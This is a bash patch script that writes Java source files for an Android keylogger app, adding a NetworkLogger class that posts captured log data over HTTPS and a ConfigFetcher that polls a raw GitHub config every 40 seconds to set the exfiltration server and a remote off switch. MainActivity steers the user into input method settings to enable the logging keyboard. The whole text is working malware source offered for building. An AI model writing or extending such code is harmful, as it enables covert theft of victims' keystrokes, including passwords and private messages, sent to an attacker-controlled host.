#!/bin/bash

# Patch Android keylogger to fetch remote config and use dynamic baseUrl

echo "[+] Patching Android project for dynamic config..."

# ---------- Overwrite NetworkLogger.java ----------
cat > app/src/main/java/com/example/keylogger/NetworkLogger.java <<'EOF'
package com.example.keylogger;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import javax.net.ssl.HttpsURLConnection;

public class NetworkLogger {

    // Dynamic server URL, updated by ConfigFetcher
    public static volatile String serverUrl = "";

    public static void setServerUrl(String url) {
        serverUrl = url;
    }

    public static void sendLog(final String jsonData) {
        // Do not send if no URL or maintenance mode is active
        if (serverUrl == null || serverUrl.isEmpty()) return;

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    URL url = new URL(serverUrl);
                    HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
                    conn.setDoOutput(true);
                    conn.setConnectTimeout(5000);
                    conn.setReadTimeout(5000);

                    OutputStream os = conn.getOutputStream();
                    os.write(jsonData.getBytes("UTF-8"));
                    os.flush();
                    os.close();

                    int responseCode = conn.getResponseCode();
                    conn.disconnect();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }
}
EOF

# ---------- Create ConfigFetcher.java ----------
cat > app/src/main/java/com/example/keylogger/ConfigFetcher.java <<'EOF'
package com.example.keylogger;

import android.util.Log;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class ConfigFetcher {

    private static final String TAG = "ConfigFetcher";
    // Remote config raw URL (update this to your actual raw GitHub URL)
    private static final String CONFIG_URL = "https://raw.githubusercontent.com/warsecurity/app.config/main/config.json";

    private static ScheduledExecutorService scheduler;

    public static void start() {
        if (scheduler != null) return;

        scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.scheduleAtFixedRate(new Runnable() {
            @Override
            public void run() {
                fetchConfig();
            }
        }, 0, 40, TimeUnit.SECONDS); // every 40 seconds
    }

    private static void fetchConfig() {
        HttpURLConnection conn = null;
        try {
            URL url = new URL(CONFIG_URL);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);

            int responseCode = conn.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    sb.append(line);
                }
                reader.close();

                JSONObject json = new JSONObject(sb.toString());
                boolean maintenance = json.optBoolean("maintenance", false);
                String baseUrl = json.optString("baseUrl", "");

                if (maintenance) {
                    // Stop sending logs if maintenance is true
                    NetworkLogger.setServerUrl("");
                    Log.i(TAG, "Maintenance mode active, logs disabled");
                } else if (!baseUrl.isEmpty()) {
                    NetworkLogger.setServerUrl(baseUrl);
                    Log.i(TAG, "Updated baseUrl: " + baseUrl);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Config fetch failed", e);
        } finally {
            if (conn != null) conn.disconnect();
        }
    }
}
EOF

# ---------- Update MainActivity.java to start ConfigFetcher ----------
cat > app/src/main/java/com/example/keylogger/MainActivity.java <<'EOF'
package com.example.keylogger;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Start fetching remote config
        ConfigFetcher.start();

        Button btnEnable = findViewById(R.id.btnEnable);
        btnEnable.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(Settings.ACTION_INPUT_METHOD_SETTINGS);
                startActivity(intent);
            }
        });
    }
}
EOF

echo "[+] Patch complete."
echo "Now rebuild with: gradle clean assembleDebug"
